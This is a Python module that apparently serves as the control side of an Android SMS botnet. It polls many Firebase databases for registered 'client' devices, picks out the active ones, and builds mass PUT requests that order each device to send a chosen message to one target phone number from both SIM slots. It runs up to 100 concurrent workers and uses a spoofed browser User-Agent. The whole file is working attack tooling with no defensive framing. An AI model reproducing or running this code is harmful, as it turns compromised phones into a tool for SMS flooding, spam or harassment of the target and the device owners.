import json
import httpx
import asyncio
import time
TIMEOUT = 30
MAX_WORKERS = 100
SMS_WORKERS = 100

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Connection": "keep-alive"
}

# Global variable to store the shared AsyncClient
_client = None

async def get_client():
    """Get or create the shared httpx.AsyncClient within the current event loop."""
    global _client
    if _client is None or _client.is_closed:
        # Initializing within the async function ensures the loop is already running
        _client = httpx.AsyncClient(
            headers=HEADERS, 
            timeout=TIMEOUT, 
            follow_redirects=True, 
            limits=httpx.Limits(max_connections=MAX_WORKERS * 2, max_keepalive_connections=MAX_WORKERS)
        )
    return _client

def normalize_url(url):
    """Ensure URL is https for Firebase domains."""
    url = url.strip().rstrip("/")
    if "firebaseio.com" in url or "firebasedatabase.app" in url:
        if url.startswith("http://"):
            url = "https://" + url[7:]
        elif not url.startswith("https://"):
            url = "https://" + url
    return url

async def fetch_clients(firebase_url, app_password=None):
    """Fetch clients from Firebase instance with retries."""
    firebase_url = normalize_url(firebase_url)
    url = firebase_url + "/clients.json"
    params = {}
    if app_password:
        params["auth"] = app_password

    max_retries = 3
    client = await get_client()
    for attempt in range(max_retries):
        try:
            response = await client.get(url, params=params)
            response.raise_for_status()
            data = response.json()
            return {"success": True, "data": data if isinstance(data, dict) else {}}
        except (httpx.ConnectError, httpx.ReadError) as e:
            if attempt == max_retries - 1:
                return {"success": False, "error": f"Network error after {max_retries} attempts: {e}"}
            await asyncio.sleep(1)
        except httpx.TimeoutException:
            return {"success": False, "error": "Request timeout"}
        except httpx.HTTPStatusError as e:
            return {"success": False, "error": f"HTTP error: {e.response.status_code}"}
        except httpx.RequestError as e:
            return {"success": False, "error": f"Request failed: {e}"}
        except Exception as e:
            return {"success": False, "error": f"Unexpected error: {e}"}

async def firebase_put(firebase_url, client_id, payload, app_password=None):
    """Send SMS command to Firebase instance with retries."""
    firebase_url = normalize_url(firebase_url)
    url = (
        firebase_url
        + f"/clients/{client_id}/webhookEvent/sendSms.json"
    )

    params = {}
    if app_password:
        params["auth"] = app_password

    max_retries = 3
    client = await get_client()
    for attempt in range(max_retries):
        try:
            response = await client.put(
                url,
                params=params,
                json=payload
            )
            response.raise_for_status()
            return {"success": True, "status": response.status_code}
        except (httpx.ConnectError, httpx.ReadError) as e:
            if attempt == max_retries - 1:
                return {"success": False, "error": f"Network error after {max_retries} attempts: {e}"}
            await asyncio.sleep(1)
        except httpx.TimeoutException:
            return {"success": False, "error": "Request timeout"}
        except httpx.HTTPStatusError as e:
            return {"success": False, "error": f"HTTP error: {e.response.status_code}"}
        except httpx.RequestError as e:
            return {"success": False, "error": f"Request failed: {e}"}
        except Exception as e:
            return {"success": False, "error": f"Unexpected error: {e}"}

def get_device_stats(clients):
    """Calculate device statistics from clients data."""
    total = len(clients)
    active = 0
    inactive = 0
    unknown = 0

    for device_id, device in clients.items():
        if isinstance(device, dict) and "status" in device:
            if device["status"] is True:
                active += 1
            elif device["status"] is False:
                inactive += 1
            else:
                unknown += 1
        else:
            unknown += 1

    return {"total": total, "active": active, "inactive": inactive, "unknown": unknown}

async def test_firebase_connection(firebase_url, app_password=None):
    """Test connection to Firebase and return stats."""
    result = await fetch_clients(firebase_url, app_password)
    
    if not result["success"]:
        return {"success": False, "error": result["error"]}
    
    stats = get_device_stats(result["data"])
    return {"success": True, "stats": stats}

async def fetch_all_firebase_stats(firebase_list):
    """Fetch stats from all Firebase instances in parallel with concurrency control."""
    sem = asyncio.Semaphore(50) # Limit to 50 concurrent connections
    
    async def fetch_single(fb):
        async with sem:
            result = await fetch_clients(fb["url"], fb.get("password"))
            if result["success"]:
                stats = get_device_stats(result["data"])
                return {"firebase_id": fb["id"], "name": fb["name"], "stats": stats, "success": True}
            else:
                return {"firebase_id": fb["id"], "name": fb["name"], "error": result["error"], "success": False}
    
    tasks = [fetch_single(fb) for fb in firebase_list]
    results = await asyncio.gather(*tasks)
    
    total_stats = {"total": 0, "active": 0, "inactive": 0, "unknown": 0}
    for result in results:
        if result["success"]:
            stats = result["stats"]
            total_stats["total"] += stats["total"]
            total_stats["active"] += stats["active"]
            total_stats["inactive"] += stats["inactive"]
            total_stats["unknown"] += stats["unknown"]
    
    return {"total_stats": total_stats, "individual_results": results}

async def prepare_firebase_tasks(firebase_list, phone, message, max_success=None):
    """
    Finds active devices and returns a list of PUT request tasks for the worker.
    Uses concurrency control to avoid network stack overflow.
    """
    sem = asyncio.Semaphore(50)

    async def get_active(fb):
        async with sem:
            res = await fetch_clients(fb["url"], fb.get("password"))
            if res["success"]:
                active = {
                    d_id: d for d_id, d in res["data"].items() 
                    if isinstance(d, dict) and d.get("status") is True
                }
                return {"fb": fb, "active": active, "success": True}
            return {"fb": fb, "active": {}, "success": False}

    active_tasks = [get_active(fb) for fb in firebase_list]
    active_results = await asyncio.gather(*active_tasks)
    
    all_active_devices = []
    for res in active_results:
        if res["success"]:
            for d_id, d in res["active"].items():
                all_active_devices.append({"fb": res["fb"], "d_id": d_id})

    sim_slots = [1, 2]
    tasks = []
    for device in all_active_devices:
        for sim in sim_slots:
            if max_success and len(tasks) >= max_success:
                break
            
            fb = device["fb"]
            fb_url = normalize_url(fb["url"])
            url = fb_url + f"/clients/{device['d_id']}/webhookEvent/sendSms.json"
            
            params = {}
            if fb.get("password"):
                params["auth"] = fb["password"]
            
            full_url = url + ("?" + "&".join([f"{k}={v}" for k,v in params.items()]) if params else "")
            
            tasks.append({
                "url": full_url,
                "method": "PUT",
                "headers": HEADERS,
                "data": json.dumps({"from": sim, "to": phone, "message": message, "isSended": False}),
                "count": 1
            })
        if max_success and len(tasks) >= max_success:
            break
            
    return tasks
